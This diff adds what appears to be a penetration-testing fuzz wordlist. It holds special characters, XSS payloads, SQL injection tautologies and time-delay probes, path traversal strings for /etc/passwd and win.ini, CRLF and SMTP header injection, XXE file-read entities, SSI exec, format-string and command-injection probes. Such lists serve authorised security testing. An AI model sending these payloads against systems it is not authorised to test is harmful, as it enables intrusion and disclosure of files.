@@ -1,0 +1,182 @@
+~
+!
+@
+#
+$
+%
+^
+&
+*
+(
+)
+_
+_
++
+=
+{
+}
+[
+|
+\
+`
+,
+.
+/
+?
+;
+:
+'
+''
+"
+""
+<
+>
+-1
+0
+1
+null
+true
+false
+%00
+%01
+%70
+%20
+%00%00
+NaN
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'"#||+>;
+'--
+';
+"--
+";
+or 9=9
+or 9=9--
+or 9=9;
+ or 9=9--
+ or 9=9;
+' or 9=9--
+' or 9=9;
+" or 9=9--
+" or 9=9;
+' or '9'='9
+' or '9'='9'
+' or '9'='9'--
+' or '9'='9';
+" or "9"="9
+" or "9"="9"
+" or "9"="9"--
+" or "9"="9";
+) or ('9'='9
+)) or ('9'='9
+) or ("9"="9
+)) or ("9"="9
+' or 9=9 or ''='
+" or 9=9 or ""="
+ union all select @@version--
+(select @@fuzzstring)
+select @@fuzzstring
+sleep(10)#
+1 or sleep(10)#
+" or sleep(10)#
+' or sleep(10)#
+" or sleep(10)="
+' or sleep(10)='
+1) or sleep(10)#
+") or sleep(10)="
+') or sleep(10)='
+1)) or sleep(10)#
+")) or sleep(10)="
+')) or sleep(10)='
+;waitfor delay '0:0:10'--
+);waitfor delay '0:0:10'--
+';waitfor delay '0:0:10'--
+";waitfor delay '0:0:10'--
+');waitfor delay '0:0:10'--
+");waitfor delay '0:0:10'--
+));waitfor delay '0:0:10'--
+'));waitfor delay '0:0:10'--
+"));waitfor delay '0:0:10'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(10)--
+1 or pg_sleep(10)--
+" or pg_sleep(10)--
+' or pg_sleep(10)--
+1) or pg_sleep(10)--
+") or pg_sleep(10)--
+') or pg_sleep(10)--
+1)) or pg_sleep(10)--
+")) or pg_sleep(10)--
+')) or pg_sleep(10)--
+x'"><SVg/oNLoad=prompt(4)>
+<meta http-equiv="refresh" content="0;javascript:alert(1)"/>
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd%00
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc//passwd
+..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd
+\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../etc/passwd
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+../../../../../../../../../../../../../../../windows/win.ini
+../../../../../../../../../../../../../../../windows/win.ini%00
+../../../../../../../../../../../../../../../boot.ini
+../../../../../../../../../../../../../../../boot.ini%00
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini%00
+..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//windows//win.ini
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p
+%0d%0aEvilHeader:%20ThisShouldntExist%0d%0a
+%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a%3Chtml%3EEvil content%3C/html%3E
+%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+pentest@coalfire.com%0d%0aRCPT+TO:+pentest@coalfire.com%0d%0aDATA%0d%0aFrom:+pentest@coalfire.com%0d%0aTo:+pentest@coalfire.com%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+<![CDATA[<test></test>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/windows/win.ini">]><foo>&xxe;</foo>
+count(/child::node())
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<foo><![CDATA[' or 1=1 or ''=']]></foo>
+&foo;
+%foo;
+*/*
+<pre><!--#exec cmd="ls" --></pre>
+<pre><!--#exec cmd="dir" --></pre>
+<!--#echo var="DOCUMENT_URI" -->
+<!--#echo var="DOCUMENT_NAME" -->
+%u003c
+%u003e
+%u0022
+\u0022
+\u003c
+\u003e
+eval("while(1);")
+{"\x00":0}
+{"1":0}
+[]
+{}
+%p%p%p%p
+%x%x%x%x
+%d%d%d%d
+%s%s%s%s
+%n%n%n%n
+%a%a%a%a
+%g%g%g%g
+%f%f%f%f
+;echo fuzzstring
+&& echo fuzzstring
+& echo fuzzstring
+`echo fuzzstring
+///eff.org
+//eff.org
+/\eff.org
+https://eff.org
